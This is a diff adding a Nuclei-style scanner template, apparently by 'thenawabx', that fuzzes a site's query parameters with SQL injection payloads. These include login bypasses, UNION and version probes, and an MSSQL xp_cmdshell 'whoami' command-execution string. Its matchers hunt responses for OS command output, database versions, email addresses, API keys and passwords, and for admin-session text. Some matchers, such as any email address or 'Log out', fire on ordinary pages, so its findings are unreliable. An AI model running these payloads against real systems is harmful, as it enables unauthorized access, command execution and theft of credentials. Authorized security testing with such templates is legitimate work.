@@ -1,0 +1,54 @@
+id: THENAWABX_FOUND_SQLI
+info:
+  name: 💉 Nawab-Command-Based-SQLi 💉
+  author: thenawabx
+  severity: critical
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}"
+    payloads:
+      sqli_cmd:
+        - "1' OR 1=1--"
+        - "1\" OR 1=1--"
+        - "admin'--"
+        - "admin' # "
+        - "1' AND (SELECT 1 FROM (SELECT(user()))a)--"
+        - "1\" AND (SELECT 1 FROM (SELECT(version()))a)--"
+        - "1' AND (SELECT 1 FROM (SELECT(database()))a)--"
+        - "'; exec master..xp_cmdshell 'whoami'--"
+        - "1' UNION SELECT @@version,user(),database()--"
+    fuzzing:
+      - part: query
+        type: replace
+        fuzz:
+          - "{{sqli_cmd}}"
+    matchers-condition: or
+    matchers:
+      - type: regex
+        part: body
+        regex:
+          - "uid=[0-9]+\\(.*?\\) gid=[0-9]+\\(.*?\\) groups=[0-9]+\\(.*?\\)"
+          - "nt authority\\\\system"
+          - "Windows IP Configuration.*?IPv4 Address"
+      - type: regex
+        part: body
+        regex:
+          - "[a-zA-Z0-9._-]+@[a-zA-Z0-9._-]+"
+          - "(MySQL|PostgreSQL|Oracle|SQLite) [0-9]+\\.[0-9]+\\.[0-9]+"
+      - type: regex
+        part: body
+        regex:
+          - "AIzaSy[A-Za-z0-9_-]{35}"
+          - "sq0csp-[0-9A-Za-z\\-_]{43}"
+          - "SK[0-9a-fA-F]{32}"
+          - "(?i)(password|passwd|pwd|db_password|api_key|secret_key)\\s*[:=>]+\\s*['\"]?[A-Za-z0-9@#$%^&*()_+]{5,}"
+      - type: word
+        part: body
+        words:
+          - "Dashboard - Admin"
+          - "Log out"
+          - "You are now logged in as admin"
+          - "User Profile: admin"
+        condition: or
